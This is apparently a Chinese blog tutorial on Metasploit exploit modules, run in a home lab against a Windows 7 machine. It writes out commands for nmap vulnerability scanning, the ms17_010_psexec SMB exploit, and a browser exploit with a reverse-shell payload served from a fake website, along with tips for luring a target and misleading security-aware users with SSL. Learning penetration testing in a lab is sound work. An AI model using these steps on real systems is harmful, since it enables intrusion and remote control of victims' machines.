# 原创
：  【MSFconsole进阶】exploits（渗透攻击模块）：Active Exploit（主动渗透攻击）、Passive Exploit（被动渗透攻击）

# 【MSFconsole进阶】exploits（渗透攻击模块）：Active Exploit（主动渗透攻击）、Passive Exploit（被动渗透攻击）

**目录**

[exploits（渗透攻击模块）](#exploits%EF%BC%88%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%EF%BC%89)

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[二、Active Exploit（主动渗透攻击）](#%E4%BA%8C%E3%80%81Active%20Exploit%EF%BC%88%E4%B8%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%EF%BC%89)

[2.1、前提：](#2.1%E3%80%81%E5%89%8D%E6%8F%90%EF%BC%9A)

[2.2、示例：](#2.2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[2.2.1、实验环境：](#2.2.1%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%EF%BC%9A)

[2.2.2、第一步：信息收集](#2.2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[2.2.3、第二步：测试目标是否在线](#2.2.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%B5%8B%E8%AF%95%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%9C%A8%E7%BA%BF)

[2.2.4、第三步：测试漏洞为ms17_010](#2.2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%B5%8B%E8%AF%95%E6%BC%8F%E6%B4%9E%E4%B8%BAms17_010)

[2.2.5、第四步：进入到会话，执行](#2.2.5%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%BF%9B%E5%85%A5%E5%88%B0%E4%BC%9A%E8%AF%9D%EF%BC%8C%E6%89%A7%E8%A1%8C)

[三、Passive Exploit（被动渗透攻击）](#%E4%B8%89%E3%80%81Passive%20Exploit%EF%BC%88%E8%A2%AB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%EF%BC%89)

[3.1、简介：](#3.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[3.2、示例](#3.2%E3%80%81%E7%A4%BA%E4%BE%8B)

[3.2.1、实验环境：](#3.2.1%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%EF%BC%9A)

[3.2.2、第一步：装载模块](#3.2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%A3%85%E8%BD%BD%E6%A8%A1%E5%9D%97)

[3.2.3、第二步：](#3.2.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[3.2.4、第三步：诱使目标点击](#3.2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%AF%B1%E4%BD%BF%E7%9B%AE%E6%A0%87%E7%82%B9%E5%87%BB)

[3.2.5、第四步：进入会话](#3.2.5%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%BF%9B%E5%85%A5%E4%BC%9A%E8%AF%9D)

---


---


 

## exploits（渗透攻击模块）

## 一、简介：

> 
利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法
分为主动（Active Exploit）、被动（Passive Exploit）
确实挺多的
 <img alt="" height="453" src="https://img-blog.csdnimg.cn/f019e145f6a7408ca41ef16f1be17087.png" width="1099"/>



---


---


 

## 二、**Active Exploit（**主动渗透攻击）

> 
<h3>2.1、前提：</h3>
发现服务---&gt;寻找漏洞
目标开启了某种服务，并且这个服务存在漏洞


> 
<h3>2.2、示例：</h3>
<h4>2.2.1、实验环境：</h4>
目标关闭防火墙
目标：Windows 7 旗舰版 Service Pack 1 。IP地址为192.168.190.138
攻击机：Kali 。IP地址为192.168.190.131

<hr/>
<h4>2.2.2、第一步：信息收集</h4>
使用nmap扫描目标主机看是否存在常见漏洞
db_nmap --script=vuln 192.168.190.138


结果

Risk factor: HIGH 
风险因素：高
A critical remote code execution vulnerability exists in Microsoft SMBv1
Microsoft SMBV1中存在关键的远程代码执行漏洞
servers (ms17-010)

<hr/>

<h4>2.2.3、第二步：测试目标是否在线</h4>
**使用辅助模块auxiliary**
# 装载具体模块
use auxiliary/scanner/discovery/arp_sweep
#可以查看相关命令
show options




**# 设置模块（目标、速度）**
set rhosts 192.168.190.138
# 设置线程
set threads 250
# 启动模块
run

如果扫不出来，就可能是有防火墙（我是提前关了防火墙的） 
<hr/>
<h4>2.2.4、第三步：测试漏洞为ms17_010</h4>
**# 使用ms17的漏洞利用模块**
use exploit/windows/smb/ms17_010_psexec
# 查看使用方法
show options



**# 设置**
set rhosts 192.168.190.138
# 执行漏洞攻击
run

Unable to find accessible named pipe!
无法找到可访问的命名管！

 Exploit completed, but no session was created.
漏洞利用完成，但未创建会话。
（如果创建成功再执行第四步）
<hr/>
<h4>2.2.5、第四步：进入到会话，执行</h4>
#可以查看已经创建的会话
session -l
#进入这个对应的shell
sessions -i ID

再执行自己想执行的命令


#### 2.2.2、第一步：信息收集

---


#### 2.2.4、第三步：测试漏洞为ms17_010

---


---


---


## 三、**Passive Exploit（**被动渗透攻击）

> 
<h3>3.1、简介：</h3>
浏览器软件漏洞攻击和文件格式漏洞攻击，引诱目标用户打开触发。
#查看支持的渗透攻击模块
show exploits    


> 
<h3>3.2、示例</h3>
<h4>3.2.1、实验环境：</h4>
目标开启防火墙
目标：Windows 7 旗舰版 Service Pack 1 。IP地址为192.168.190.138
攻击机：Kali 。IP地址为192.168.190.131

现在使用（主动攻击）Active进行攻击不会成功
使用（被动攻击）Passive，构造链接，诱使目标连接，利用浏览器的漏洞

<hr/>

<h4>3.2.2、第一步：装载模块</h4>
**挂载模块**
use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
show options<br/>  



<hr/>

<h4>3.2.3、第二步：</h4>

伪造网站，诱使目标打开
SRVHOST可以指定为本机的IP地址，我们也可以打开SSL和设置SSL的证书，迷惑有安全意识的用户
URIPATH是访问的URL地址，可手动指定，比如192.168.190.131/service（一般默认根目录）
<hr/>
**#设置**
set SRVHOST 192.168.190.131
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.190.131
exploit



<hr/>
<h4>3.2.4、第三步：诱使目标点击</h4>
伪造了一个存在漏洞利用代码的WEB站点，这个站点等待浏览器版本存在漏洞的用户去访问它，将exploit注入到浏览器进程中，利用浏览器漏洞执行payload
我们在目标PC上用不同浏览器访问这个URL


访问以后，就会有记录，并尝试建立连接
没有后续就是可能没有相关已知的漏洞，一直处于等待阶段
<hr/>

<h4>3.2.5、第四步：进入会话</h4>
#可以查看已经创建的会话
session -l
#进入这个对应的shell
sessions -i ID

再执行自己想执行的命令


#### 3.2.2、第一步：装载模块

---


---


#### 3.2.4、第三步：诱使目标点击
